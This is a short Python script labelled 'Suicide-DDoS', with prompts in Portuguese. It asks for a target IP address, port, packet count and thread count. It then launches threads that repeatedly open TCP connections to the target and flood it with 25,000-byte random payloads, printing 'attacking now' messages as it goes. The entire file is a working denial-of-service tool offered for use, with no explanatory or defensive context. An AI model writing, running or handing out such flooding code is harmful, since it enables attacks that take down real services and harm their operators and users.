import random
import socket
import os
import time
import threading

print("  Suicide-DDoS  \n  by: t4ucci\n")

ip = str(input("[♤] Endereço: "))
port = int(input("[♤] Porta: "))
packs = int(input("[♤] Quant. Pacotes: "))
thread = int(input("[♤] Velocidade do Envio: "))

def start():
    hh = random._urandom(25000)
    xx = int(0)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            for i in range(packs):
                s.sendto(hh, (ip, port))
                xx += 1
                print('Atacando agora '+ip+' || Enviando: '+str(xx))
        except:
             s.close()
             print("Feito!")
for x in range(thread):
    thred = threading.Thread(target=start)
    thred.start()
















